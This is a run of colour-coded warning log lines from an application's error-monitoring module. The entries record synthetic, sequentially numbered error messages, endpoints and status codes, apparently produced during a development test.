WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.794999Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2018'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795047Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2019'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795094Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2020'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795142Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2021'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795190Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2022'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795293Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2023'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795361Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2024'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795457Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2025'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795525Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2026'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795580Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2027'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795632Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2028'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795687Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2029'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795736Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2030'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795787Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2031'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795841Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2032'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795893Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2033'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795945Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2034'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.795997Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2035'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796048Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2036'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796098Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2037'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796147Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2038'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796196Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2039'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796245Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2040'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796293Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2041'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796341Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2042'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796389Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2043'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796436Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2044'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796484Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2045'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796532Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2046'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796580Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2047'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2048'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796674Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m41[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2049'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796722Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2050'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796770Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2051'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796817Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2052'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2053'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796912Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2054'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.796959Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2055'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797006Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2056'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.797092Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m42[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2057'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
